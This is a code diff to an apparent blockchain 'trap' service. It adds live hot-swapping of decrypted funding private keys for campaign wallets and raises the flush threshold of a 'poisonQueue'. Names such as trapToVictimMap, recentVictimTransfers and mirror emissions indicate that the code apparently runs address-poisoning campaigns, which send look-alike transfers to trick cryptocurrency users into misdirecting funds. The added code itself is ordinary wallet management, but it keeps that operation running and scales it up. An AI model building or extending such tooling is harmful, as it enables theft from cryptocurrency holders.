@@ -349,10 +349,59 @@ function subscribeToNewTraps() {
           const isEnabled = payload.new.counter_poison_enabled !== false;
           const current = campaignSettings.get(campId) || {};
 
-          // Only log if it actually changed
+          // 1. Check Toggle Change
           if (current.counterPoisonEnabled !== isEnabled) {
             campaignSettings.set(campId, { ...current, counterPoisonEnabled: isEnabled });
             logger.info(`[REALTIME] 🎛️ Campaign ${campId} counter-poison toggled to: ${isEnabled ? 'ON 🟢' : 'OFF 🔴'}`);
+          }
+
+          // 2. 🚀 HOT-SWAP FUNDING KEY DETECTION
+          const newEncKey = payload.new.funding_private_key_enc;
+          const currentWallet = campaignMirrorWallets.get(campId);
+
+          // Scenario A: User deleted the funding key
+          if (newEncKey === null && currentWallet) {
+            logger.warn(`[REALTIME] 🗑️ Funding key removed for campaign ${campId}. Disabling mirror emissions.`);
+            campaignMirrorWallets.delete(campId);
+            if (campaignNonces.has(campId)) campaignNonces.get(campId).clear();
+          }
+          // Scenario B: User updated the funding key
+          else if (newEncKey && (!currentWallet || currentWallet.encKey !== newEncKey)) {
+            logger.info(`[REALTIME] 🔑 Funding key change detected for campaign ${campId}. Hot-swapping wallet...`);
+            try {
+              let fundingKey = decrypt(newEncKey).trim();
+              if (!fundingKey.startsWith('0x')) fundingKey = `0x${fundingKey}`;
+
+              if (/^0x[a-fA-F0-9]{64}$/.test(fundingKey)) {
+                const fundingAccount = privateKeyToAccount(fundingKey);
+                const newWalletClient = createWalletClient({
+                  account: fundingAccount,
+                  chain: viemChain,
+                  transport: fallback(
+                    fallbackUrls.map(url => http(url, { timeout: 15000 })),
+                    { rank: true, retryCount: 3, retryDelay: 1000 }
+                  ),
+                });
+
+                // 🚀 CRITICAL: Clear old nonce to prevent "nonce too low" errors on the new wallet
+                if (currentWallet && campaignNonces.has(campId)) {
+                  campaignNonces.get(campId).delete(currentWallet.operatorAddress);
+                }
+
+                // Inject the new wallet into the live memory map
+                campaignMirrorWallets.set(campId, {
+                  walletClient: newWalletClient,
+                  operatorAddress: fundingAccount.address,
+                  encKey: newEncKey
+                });
+
+                logger.info(`[REALTIME] ✅ Successfully hot-swapped funding wallet to ${fundingAccount.address} for campaign ${campId}`);
+              } else {
+                logger.warn(`[REALTIME] ⚠️ New funding key for campaign ${campId} has invalid format.`);
+              }
+            } catch (err) {
+              logger.error(`[REALTIME] ❌ Failed to hot-swap funding key for campaign ${campId}: ${err.message}`);
+            }
           }
         }
       }
@@ -444,7 +493,8 @@ async function loadTrapsFromDB() {
           });
           campaignMirrorWallets.set(camp.id, {
             walletClient,
-            operatorAddress: fundingAccount.address
+            operatorAddress: fundingAccount.address,
+            encKey: camp.funding_private_key_enc // 🚀 Store to detect future hot-swaps
           });
           console.log(`[DEBUG] Campaign ${camp.id} funding key loaded (operator: ${fundingAccount.address})`);
         } catch (err) {
@@ -589,7 +639,7 @@ const recentVictimTransfers = new Map();
 const trapToVictimMap = new Map();
 
 // 🚀 BATCH PROCESSING: Queue-and-flush system
-const BATCH_FLUSH_THRESHOLD = 150;
+const BATCH_FLUSH_THRESHOLD = 500;
 const BATCH_FLUSH_INTERVAL_MS = 600000;
 const poisonQueue = new Map();
 let queueFlushTimer = null;
